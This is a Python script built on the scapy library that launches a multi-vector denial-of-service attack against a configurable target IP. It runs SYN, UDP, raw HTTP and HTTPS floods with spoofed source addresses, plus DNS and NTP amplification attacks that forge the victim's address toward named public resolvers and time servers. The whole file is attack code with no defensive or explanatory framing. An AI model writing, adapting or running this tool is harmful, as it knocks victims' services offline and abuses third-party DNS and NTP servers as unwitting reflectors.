from scapy.all import *
import random
import time
import threading

# Target IP and port
target_ip = "192.168.1.1"  # Replace with your target IP
target_port = 80  # Replace with your target port

# Source IPs (spoofed)
source_ips = ["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5"]

# Global flag to stop attacks when CTRL+C is pressed
running = True  

# Function to generate random IP addresses
def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# SYN Flood Attack
def syn_flood():
    print(f"🚀 Launching SYN flood attack on {target_ip}:{target_port}...")
    while running:
        src_ip = random.choice(source_ips)
        src_port = random.randint(1024, 65535)

        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip_layer / tcp_layer

        send(packet, verbose=False)

# UDP Flood Attack
def udp_flood():
    print(f"🔥 Launching UDP flood attack on {target_ip}:{target_port}...")
    while running:
        src_ip = random_ip()

        ip_layer = IP(src=src_ip, dst=target_ip)
        udp_layer = UDP(sport=random.randint(1024, 65535), dport=target_port)
        payload = b"A" * random.randint(50, 500)
        packet = ip_layer / udp_layer / Raw(load=payload)

        send(packet, verbose=False)

# DNS Amplification Attack
def dns_amplification():
    print(f"🌐 Launching DNS amplification attack targeting {target_ip}...")
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
    while running:
        spoofed_ip = target_ip  # Spoof victim's IP
        dns_server = random.choice(dns_servers)

        ip_layer = IP(src=spoofed_ip, dst=dns_server)
        udp_layer = UDP(sport=random.randint(1024, 65535), dport=53)
        dns_layer = DNS(rd=1, qd=DNSQR(qname="example.com", qtype=random.choice(["A", "MX", "NS", "TXT"])))
        packet = ip_layer / udp_layer / dns_layer

        send(packet, verbose=False)

# HTTP Flood Attack
def http_flood():
    print(f"🌍 Launching HTTP flood attack on {target_ip}...")
    while running:
        src_ip = random_ip()
        http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=80, flags="PA")
        packet = ip_layer / tcp_layer / Raw(load=http_request.encode())

        send(packet, verbose=False)

# HTTPS Flood Attack
def https_flood():
    print(f"🔐 Launching HTTPS flood attack on {target_ip}...")
    while running:
        src_ip = random_ip()
        encrypted_data = b"\x16\x03\x01" + os.urandom(200)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=443, flags="PA")
        packet = ip_layer / tcp_layer / Raw(load=encrypted_data)

        send(packet, verbose=False)

# NTP Amplification Attack
def ntp_amplification():
    print(f"⏳ Launching NTP amplification attack on {target_ip}...")
    ntp_servers = ["129.6.15.28", "132.163.4.101", "131.107.13.100"]
    while running:
        spoofed_ip = target_ip
        ntp_server = random.choice(ntp_servers)

        ip_layer = IP(src=spoofed_ip, dst=ntp_server)
        udp_layer = UDP(sport=random.randint(1024, 65535), dport=123)
        ntp_layer = Raw(load="\x17\x00\x02\x2a" + "\x00" * 40)
        packet = ip_layer / udp_layer / ntp_layer

        send(packet, verbose=False)

# Launch all attacks in parallel
if __name__ == "__main__":
    attack_threads = [
        threading.Thread(target=syn_flood),
        threading.Thread(target=udp_flood),
        threading.Thread(target=dns_amplification),
        threading.Thread(target=http_flood),
        threading.Thread(target=https_flood),
        threading.Thread(target=ntp_amplification),
    ]

    try:
        for thread in attack_threads:
            thread.start()

        while True:
            time.sleep(1)  # Keep the main thread running

    except KeyboardInterrupt:
        print("\n⚠️ CTRL+C detected! Stopping all attacks...")
        running = False  # Stop all attack loops

        for thread in attack_threads:
            thread.join()

        print("✅ All attacks stopped. Exiting.")
